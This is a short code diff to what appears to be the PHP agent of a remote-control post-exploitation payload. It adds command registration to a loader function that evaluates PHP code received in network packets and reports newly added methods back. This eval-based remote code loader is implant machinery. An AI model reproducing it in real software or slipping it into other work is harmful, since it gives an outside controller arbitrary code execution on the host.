@@ -30,6 +30,18 @@ if (!isset($GLOBALS['readers'])) {
     $GLOBALS['readers'] = array();
 }
 
+# global list of extension commands
+if (!isset($GLOBALS['commands'])) {
+    $GLOBALS['commands'] = array("core_loadlib");
+}
+
+function register_command($c) {
+    global $commands;
+    if (! in_array($c, $commands)) {
+        array_push($commands, $c);
+    }
+}
+
 function my_print($str) {
     #error_log($str);
 }
@@ -389,14 +401,20 @@ function core_shutdown($req, &$pkt) {
 # isn't compressed before eval'ing it
 # TODO: check for zlib support and decompress if possible
 function core_loadlib($req, &$pkt) {
+    global $commands;
     my_print("doing core_loadlib");
     $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
     if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
         return ERROR_FAILURE;
-    } else {
-        eval($data_tlv['value']);
-        return ERROR_SUCCESS;
     }
+    $tmp = $commands;
+    eval($data_tlv['value']);
+    $new = array_diff($commands, $tmp);
+    foreach ($new as $meth) {
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, $meth));
+    }
+
+    return ERROR_SUCCESS;
 }
 
 
